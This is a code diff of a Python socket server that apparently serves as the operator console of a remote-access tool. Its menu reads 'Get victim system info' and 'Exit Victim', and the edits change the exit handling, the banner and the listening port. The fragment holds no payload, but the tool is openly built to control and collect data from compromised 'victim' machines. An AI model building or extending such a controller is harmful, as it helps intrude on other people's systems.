@@ -3,9 +3,7 @@ from dataclasses import *
 
 import socket
 import json
-import threading
-import time
-import random
+import os
 from _thread import *
 class bcolors:
     HEADER = '\033[95m'
@@ -68,7 +66,7 @@ def print_connected()->str:
     print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"="*31+" "*30+"="*31+" "*30+"="*31+" "*36+"|"+bcolors.ENDC)
     print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC)
     print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC) 
-    print(bcolors.BOLD+bcolors.WARNING+"|"+" "*36+"|"+"  1) Get victim system info  "+"|"+" "*30+"|"+"           2) Exit           "+"|"+" "*30+"|"+"        3) Close app         "+"|"+" "*36+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.WARNING+"|"+" "*36+"|"+"  1) Get victim system info  "+"|"+" "*30+"|"+"        2) Exit Victim       "+"|"+" "*30+"|"+"        3) Close app         "+"|"+" "*36+"|"+bcolors.ENDC)
 
 
     print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC)
@@ -187,10 +185,12 @@ def print_data(data : dict) -> None:
     Returns:
         None
     """
+    print_top()
     for key in data:
         value=data[key]
         for key2 in value:
             styled_print(str(value[key2]),bcolors.OKBLUE)
+    print_down()
 def input_data() -> dict:
     """input data
 
@@ -207,7 +207,7 @@ def input_data() -> dict:
     elif user_input=="2":
         data["command"]="exit"
     elif user_input=="3":
-        exit()
+        os._exit(0)
     else:
         print_top()
         print_wrong()
@@ -240,7 +240,7 @@ if __name__== '__main__':
     print_top()
     print_waiting()
     print_down()
-    server=create_server('0.0.0.0',45673)
+    server=create_server('0.0.0.0',45669)
     
     while True:
         connection,address=accept_client(server)        
